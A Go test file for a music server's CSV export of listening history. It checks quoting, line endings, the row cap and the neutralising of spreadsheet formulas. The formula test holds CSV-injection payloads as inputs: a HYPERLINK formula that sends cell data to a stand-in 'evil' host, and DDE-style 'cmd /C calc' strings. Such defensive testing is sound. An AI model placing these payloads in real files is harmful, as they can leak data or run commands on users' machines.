package api

import (
	"net/http"
	"strings"
	"testing"
	"time"

	"beatbump-server/backend/db"
)

// BI3: me/stats/export.csv is an RFC 4180 attachment of the profile's plays,
// newest first, with the artist/album fallbacks of the stats aggregates.
func TestExportCSVFormatAndScope(t *testing.T) {
	useTestDB(t)
	t0 := time.Date(2026, 9, 30, 10, 0, 0, 0, time.UTC)
	rows := []db.PlayEvent{
		{ProfileID: "p-test", Ref: "a", Title: `Say "Hi", now`, Artist: "A, B", Album: "Al\nbum", Source: "local", PlayedAt: t0},
		{ProfileID: "p-test", Ref: "b", Title: "Song A", Data: songBody, Source: "youtube", PlayedAt: t0.Add(time.Hour)},
		{ProfileID: "p-other", Ref: "c", Title: "Not mine", Source: "local", PlayedAt: t0.Add(2 * time.Hour)},
	}
	if err := db.DB.Create(&rows).Error; err != nil {
		t.Fatal(err)
	}
	c, rec := ctxFor(http.MethodGet, "/api/v1/me/stats/export.csv", "", nil)
	if err := MeStatsExportCSVHandler(c); err != nil {
		t.Fatalf("handler: %v", err)
	}
	if rec.Code != http.StatusOK {
		t.Fatalf("status %d", rec.Code)
	}
	if ct := rec.Header().Get("Content-Type"); !strings.HasPrefix(ct, "text/csv") {
		t.Fatalf("content-type %q", ct)
	}
	if cd := rec.Header().Get("Content-Disposition"); cd != `attachment; filename="ecoutes.csv"` {
		t.Fatalf("content-disposition %q", cd)
	}
	want := "\xEF\xBB\xBF" + "playedAt,title,artist,album,source\r\n" +
		"2026-09-30T11:00:00Z,Song A,Artist One,Album X,youtube\r\n" +
		// encoding/csv with UseCRLF also writes CRLF inside a quoted field (RFC 4180 line breaks).
		"2026-09-30T10:00:00Z,\"Say \"\"Hi\"\", now\",\"A, B\",\"Al\r\nbum\",local\r\n"
	if got := rec.Body.String(); got != want {
		t.Fatalf("body:\n%q\nwant:\n%q", got, want)
	}
}

func TestExportCSVCappedNewestFirst(t *testing.T) {
	useTestDB(t)
	prev := exportCSVMaxRows
	exportCSVMaxRows = 3
	t.Cleanup(func() { exportCSVMaxRows = prev })
	t0 := time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC)
	var rows []db.PlayEvent
	for i := 0; i < 5; i++ {
		rows = append(rows, db.PlayEvent{ProfileID: "p-test", Ref: "r", Title: string(rune('a' + i)), Source: "local", PlayedAt: t0.Add(time.Duration(i) * time.Minute)})
	}
	if err := db.DB.Create(&rows).Error; err != nil {
		t.Fatal(err)
	}
	c, rec := ctxFor(http.MethodGet, "/api/v1/me/stats/export.csv", "", nil)
	if err := MeStatsExportCSVHandler(c); err != nil {
		t.Fatal(err)
	}
	lines := strings.Split(strings.TrimSuffix(strings.TrimPrefix(rec.Body.String(), "\xEF\xBB\xBF"), "\r\n"), "\r\n")
	if len(lines) != 4 {
		t.Fatalf("lines %d, want header + 3: %q", len(lines), lines)
	}
	for i, title := range []string{"e", "d", "c"} {
		if !strings.Contains(lines[i+1], ","+title+",") {
			t.Fatalf("line %d = %q, want title %q", i+1, lines[i+1], title)
		}
	}
}

func TestExportCSVEmptyProfile(t *testing.T) {
	useTestDB(t)
	c, rec := ctxFor(http.MethodGet, "/api/v1/me/stats/export.csv", "", nil)
	if err := MeStatsExportCSVHandler(c); err != nil {
		t.Fatal(err)
	}
	if rec.Body.String() != "\xEF\xBB\xBFplayedAt,title,artist,album,source\r\n" {
		t.Fatalf("body %q", rec.Body.String())
	}
}

// L8-3: a cell starting with a formula character is prefixed with `'` so a
// spreadsheet shows it as text; the file starts with a UTF-8 BOM.
func TestExportCSVNeutralisesFormulas(t *testing.T) {
	for in, want := range map[string]string{
		`=HYPERLINK("https://evil/?c="&A1;"ouvrir")`: `'=HYPERLINK("https://evil/?c="&A1;"ouvrir")`,
		"=1+1":           "'=1+1",
		"+33 6":          "'+33 6",
		"-cmd|' /C calc": "'-cmd|' /C calc",
		"@SUM(A1)":       "'@SUM(A1)",
		"\t=1":           "'\t=1",
		"\r=1":           "'\r=1",
		" =1+1":          " =1+1",
		"Édith Piaf":     "Édith Piaf",
		"":               "",
	} {
		if got := csvSafe(in); got != want {
			t.Errorf("csvSafe(%q) = %q, want %q", in, got, want)
		}
	}

	useTestDB(t)
	t0 := time.Date(2026, 9, 30, 10, 0, 0, 0, time.UTC)
	rows := []db.PlayEvent{
		{ProfileID: "p-test", Ref: "a", Title: "=1+1", Artist: "@evil", Album: `-=cmd|' /C calc'!A0`, Source: "local", PlayedAt: t0},
		{ProfileID: "p-test", Ref: "b", Title: "+Plus, ok", Artist: "Édith", Album: "", Source: "youtube", PlayedAt: t0.Add(time.Hour)},
	}
	if err := db.DB.Create(&rows).Error; err != nil {
		t.Fatal(err)
	}
	c, rec := ctxFor(http.MethodGet, "/api/v1/me/stats/export.csv", "", nil)
	if err := MeStatsExportCSVHandler(c); err != nil {
		t.Fatal(err)
	}
	body := rec.Body.String()
	if !strings.HasPrefix(body, "\xEF\xBB\xBF") {
		t.Fatalf("no UTF-8 BOM: %q", body[:8])
	}
	want := "\xEF\xBB\xBFplayedAt,title,artist,album,source\r\n" +
		"2026-09-30T11:00:00Z,\"'+Plus, ok\",Édith,,youtube\r\n" +
		"2026-09-30T10:00:00Z,'=1+1,'@evil,'-=cmd|' /C calc'!A0,local\r\n"
	if body != want {
		t.Fatalf("body:\n%q\nwant:\n%q", body, want)
	}
	for _, cell := range []string{",=", ",+", ",-", ",@"} {
		if strings.Contains(body, cell) {
			t.Fatalf("unquoted formula lead %q in %q", cell, body)
		}
	}
}
